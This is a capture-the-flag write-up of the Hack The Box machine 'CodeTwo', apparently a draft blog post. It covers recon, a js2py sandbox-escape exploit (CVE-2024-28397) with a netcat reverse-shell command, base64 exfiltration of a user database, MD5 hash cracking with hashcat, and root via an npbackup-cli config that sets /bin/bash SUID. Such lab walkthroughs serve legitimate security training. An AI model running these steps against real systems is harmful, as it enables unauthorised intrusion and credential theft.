---
title: Code Two
draft: true
tags:
  - HTB
  - Writeup
---




CodeTwo is an easy rated machine where we have to do a little bit of source code analysis in order to find a way in. Then, we obtain the password hashes for the user `marco` on the web application. After cracking the hash for `marco`, we can ssh into the box as this user. Since this user has `sudo` privileges to run a backup utility, it's possible to run it with a custom config file that runs arbitrary commands, getting a `root` shell.

## Initial recon

We start running a portscan using `nmap`:
```shell
┌──(jpablo㉿kali)-[~/Documents/HTB/Machines/CodeTwo]
└─$ sudo nmap -sS -sV 10.129.231.202 -oA codeTwo-init -v        

Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 10:18 -03
<SNIP>
Discovered open port 22/tcp on 10.129.231.202
Discovered open port 8000/tcp on 10.129.231.202
<SNIP>

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Gunicorn 20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```


The portscan shows that there is an http server running on port 8000. So let's open that site:
![[CodeTwo/Images/codeTwo.png]]

The website shows that CodeTwo application provides a platform for developers to *write, save and **run** their JavaScript code.* It also says it's open source, and offers a _Download App_ button. So let's download the project and inspect the code.

Opening `app.py` we can see the application's source code, and within we see a very interesting route:
```python

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})

```
The above snippet tells us that the application exposes a route `/run_code` that takes a `code` parameter in `json` format.
That code is then passed to the function `eval_js` from the `js2py` package.

According to the official [PyPi page for js2py](https://pypi.org/project/Js2Py/), this package "_Translates JavaScript to Python code_" and "_Js2Py is able to translate and execute virtually any JavaScript code._".

So, let's recap what we have so far; We found a `/run_code` endpoint that accepts a `POST` request, with a `code` parameter containing JavaScript code to be run.
Now, a key thing to remember is that it **translates** JavaScript to Python, so in the end what runs is Python code.

That's a good start.

Now, it would be awesome if we could use it to execute code in the server and get a reverse shell.

From online research, we find there is a public exploit for this library, that allows for system command execution: [CVE-2024-28397](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape).
We can also find another exploit, based on CVE-2024-28397, that already has a reverse shell payload by default. For simplicity, we'll use: **[CVE-2024-28397-RCE](https://github.com/harutomo-jp/CVE-2024-28397-RCE)**

We download [this file](https://github.com/harutomo-jp/CVE-2024-28397-RCE/blob/main/CVE-2024-28397-RCE.py), and save it as `xploit.py`.

As always, we must review the exploit code and customise it for our needs. In this case, we see we can pass our custom arguments, such as IP and port for our reverse shell, as command line arguments.

We can see that if no command argument is passed, the default (reverse shell) will execute.
`cmd = f"busybox nc {args.local_ip} {args.local_port} -e sh"`

Next, we need to setup our netcat listener to capture the reverse shell. We do this by running:
` nc -lvnp 4545`

Now, we can try the exploit against our target:
`python3 xploit.py 10.129.231.202 /run_code --local_ip 10.10.14.78 --local_port 4545`
Here, 10.10.14.78 is our local IP and 4545 is our netcat listener's port.

After a few seconds, we should see that our netcat listener captured the reverse shell:
```shell
┌──(jpablo㉿kali)-[~/Documents/HTB/Machines/CodeTwo]
└─$ nc -lvnp 4545
listening on [any] 4545 ...
connect to [10.10.14.78] from (UNKNOWN) [10.129.231.202] 51490
id
uid=1001(app) gid=1001(app) groups=1001(app)
ls
__pycache__
app.py
instance
requirements.txt
static
templates
pwd
/home/app/app

```

This is great. We can now browse and run commands into the server as the `app` user.

We see there is a `marco` user, but we can't access their home directory, nor their data.
Let's keep looking.


Back into the `app` home directory, we see there is an `app` folder inside, with the following contents:

```shell
cd app
ls -lah
total 32K    
drwxrwxr-x    6 app      app         4.0K Feb 23 05:18 .
drwxr-x---    5 app      app         4.0K Apr  6 03:22 ..
drwxr-xr-x    2 app      app         4.0K Feb  1  2025 __pycache__
-rw-r--r--    1 app      app         3.6K Feb  1  2025 app.py
drwxrwxr-x    2 app      app         4.0K Jan 21  2025 instance
-rw-rw-r--    1 app      app           49 Jan 17  2025 requirements.txt
drwxr-xr-x    4 app      app         4.0K Jun 11 07:51 static
drwxr-xr-x    2 app      app         4.0K Jun 26 13:43 templates

```

Inside the `instance` folder, the following files are present:
```shell
cd instance
ls -lah
total 24K    
drwxrwxr-x    2 app      app         4.0K Jan 21  2025 .
drwxrwxr-x    6 app      app         4.0K Feb 23 05:18 ..
-rw-r--r--    1 app      app        16.0K Jun 18 08:36 users.db

```

This looks just like the same data we downloaded at the beginning. But, if we attempt to print the contents of `user.db` we see a difference:
```shell
cat users.db
�O�O�J%%�Wtablecode_snippetcode_snippetCREATE TABLE code_snippet (
        id INTEGER NOT NULL, 
        user_id INTEGER NOT NULL, 
        code TEXT NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
)�0�CtableuseruserCREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password_hash VARCHAR(128) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
���'Mappa97588c0e2faXXXXXX339e27aeb42e)Mmarco649c9d65a206a75f5abeXXXXXX28bce5
���app  marco

```

Clearly we can't use this as is, but we see that there is an entry in the `users.db` database, whereas the one we downloaded is empty.
So, let's _exfiltrate_ this database by first zipping it, and then printing it out base64 encoded:
```shell
zip db.zip users.db
  adding: users.db (deflated 97%)
ls
db.zip
users.db

base64 db.zip
UEsDBBQAAAAIAIFE0lqUptKS5QEAAABAAAAIABwAdXNlcnMuZGJVVAkAA3F6Umjh1KVodXgLAAEE
6QMAAATpAwAA7dkxb9NAFAfwsx2RJlJxpSrywnBL1VhCyHHixBYDhOhaAolDXQfoFF3si2qpiU3s
Ctb28/BdmBj4FB1hxA4tapCgCyhC+v+ks313T+f3dNPZx0eDKBN0Fi/nPKNNskMkiTyllBBSum43
5F/6ErlbiTx68mVb/UaU+yOiPlA/5TcAAAAAAAD4/128UMra3p50+Sbj0zMRxKGYpIsoSUR2+7nU
81jXZ9TvPhswenuG1quVKKR912eHzKPuyKfueDB4SKuV81QsJ7+ZK5agPnvrr42+8vrDrndCX7IT
Wo9CvRg7GHmsf+gWY/XrFXXqsQPmMbfHjmkxtgqu6heGVNZqNemytyqmmCmavJb8j/g/Jr3gc0Ff
d73e865Xtw19LSDhafo+XoaTU56e/oxqmLZ+Zyljt380ZrR+84485X35nva4JpFoEYoP6buz/Gw/
4edZvOpPVvU2iquS79VWsWHbeZPVj0T9nF8AAAAAAAAAYOP25RLZHfIk4U7Hsu3AEOaMN7lhtuxO
u9l0hNnhYtoyhS6ViDac82UQt1tO4IRti5tGm3esmcWnwjKcmWiY9jQQVpUU5/8rol6pXzddHwAA
AAAAAAD8FWVlV+JJIm8pWmX1faD4/092Np0WAAAAAAAAAPxL3wFQSwECHgMUAAAACACBRNJalKbS
kuUBAAAAQAAACAAYAAAAAAAAAAAApIEAAAAAdXNlcnMuZGJVVAUAA3F6Umh1eAsAAQTpAwAABOkD
AABQSwUGAAAAAAEAAQBOAAAAJwIAAAAA

```
Now, we can copy and paste the base64 string from the terminal.
Create a new file, and paste this string as the content. Now, let's remove the new-line characters.
We can do this quickly in Mousepad as follows:

![[CodeTwo/Images/codeTwo-mousepad.png]]

Click on _Replace All_, and save the file as `db.zip`. Next, extract this zip file, in order to retrieve the server's `users.db`.

Now that we have the server's database, we can explore it with a SQLite database explorer. Here, I'll use "DB Browser for SQLite":

![[CodeTwo/Images/codeTwo-hashes.png]]
We see there are two users `app` and `marco`. Now, we already have command execution as `app`, let's aim for `marco`.

Revisiting the `app.py` file we initially downloaded, we see that the algorithm used for passwords is `md5`:
```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        user = User.query.filter_by(username=username, password_hash=password_hash).first()
        if user:
            session['user_id'] = user.id
            session['username'] = username;
            return redirect(url_for('dashboard'))
        return "Invalid credentials"
    return render_template('login.html')

```

So, we have the hash value and we know the algorithm, let's try to crack it using `hashcat` and `rockyou.txt`:

```shell
$ hashcat -a 0 -m 0 '649c9d65xINSERTxHASHxHEREx8bce5' /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

649c9d65xINSERTxHASHxHEREx8bce5:swxTHISxISxTHExPASSWORDxve       
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 649c9d65xINSERTxHASHxHEREx8bce5
Time.Started.....: Thu Aug 21 11:52:14 2025 (0 secs)
Time.Estimated...: Thu Aug 21 11:52:14 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 17686.7 kH/s (3.82ms) @ Accel:2048 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4980736/14344385 (34.72%)
Rejected.........: 0/4980736 (0.00%)
Restore.Point....: 2490368/14344385 (17.36%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: zoeemma2007 -> nuquni89yHt
Hardware.Mon.#1..: Temp: 46c Fan:  0% Util: 25% Core:1695MHz Mem:6800MHz Bus:16


Started: Thu Aug 21 11:52:07 2025
Stopped: Thu Aug 21 11:52:16 2025
```

I've redacted the hash and cleartext password to not spoil the fun of cracking it. As you can see it took almost 10 seconds to crack.

Now that we have `marco`'s cleartext password, going back to the initial portscan, we may attempt to ssh into the box:
```shell
┌──(jpablo㉿kali)-[~/Documents/HTB/Machines/CodeTwo]
└─$ ssh marco@10.129.231.202                
<SNIP>

Last login: Wed Aug 20 14:52:36 2025 from 10.10.14.78
marco@codetwo:~$ ls
backups  npbackup.conf  user.txt

```

And, we are inside and can get our first flag: `user.txt`

Now, our next step is to elevate our privileges to `root`.
So, we can start by checking if we have `sudo` privileges, and if so, over what.
We do this by running:
```shell
marco@codetwo:~$ sudo -l
Matching Defaults entries for marco on codetwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codetwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli

```

According to this output, we can run `npbackup-cli` using its full path: `/usr/local/bin/npbackup-cli`

Let's find a little bit more about this program:
```shell
marco@codetwo:~$ /usr/local/bin/npbackup-cli --help
usage: npbackup-cli [-h] [-c CONFIG_FILE] [--repo-name REPO_NAME] [--repo-group REPO_GROUP] [-b] [-f] [-r RESTORE] [-s] [--ls [LS]]
                    [--find FIND] [--forget FORGET] [--policy] [--housekeeping] [--quick-check] [--full-check] [--check CHECK] [--prune [PRUNE]]
                    [--prune-max] [--unlock] [--repair-index] [--repair-packs REPAIR_PACKS] [--repair-snapshots] [--repair REPAIR] [--recover]
                    [--list LIST] [--dump DUMP] [--stats [STATS]] [--raw RAW] [--init] [--has-recent-snapshot]
                    [--restore-includes RESTORE_INCLUDES] [--snapshot-id SNAPSHOT_ID] [--json] [--stdin] [--stdin-filename STDIN_FILENAME] [-v]
                    [-V] [--dry-run] [--no-cache] [--license] [--auto-upgrade] [--log-file LOG_FILE] [--show-config]
                    [--external-backend-binary EXTERNAL_BACKEND_BINARY] [--group-operation GROUP_OPERATION] [--create-key CREATE_KEY]
                    [--create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK]
                    [--create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK] [--check-config-file]

```

If we open the `npbackup.conf` file, we can see that it contains the configuration for a backup schedule. One interesting section is the `pre_exec_commands: []`.
If we try to edit it, VIM says we are modifying a read-only file. And indeed, this file is owned by `root:root`.
So, we can create a copy of this file, modify the copy and then call the `npbackup-cli` with our config file.
Let's do it:
```shell
marco@codetwo:~$ cp npbackup.conf jpablo.conf

```


Then, we insert our command in the `pre_exec_commands` section:
```shell
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: ["chmod 4755 /bin/bash"]
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
```

Now, we can run the npbackup-cli tool and instruct it to use our config file:
```shell
marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli -c jpablo.conf -b

```

If everything went well, now the `/bin/bash` executable has the SUID flag on. Allowing us to run `/bin/bash -p` and get a root shell:
```shell
marco@codetwo:~$ ls /bin/bash
/bin/bash
marco@codetwo:~$ /bin/bash -p
bash-5.0# id
uid=1000(marco) gid=1000(marco) euid=0(root) groups=1000(marco),1003(backups)
bash-5.0# whoami 
root
bash-5.0# cd /
bash-5.0# ls
bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
bash-5.0# cd root
bash-5.0# ls
root.txt  scripts


```

And we have our second flag: `root.txt`

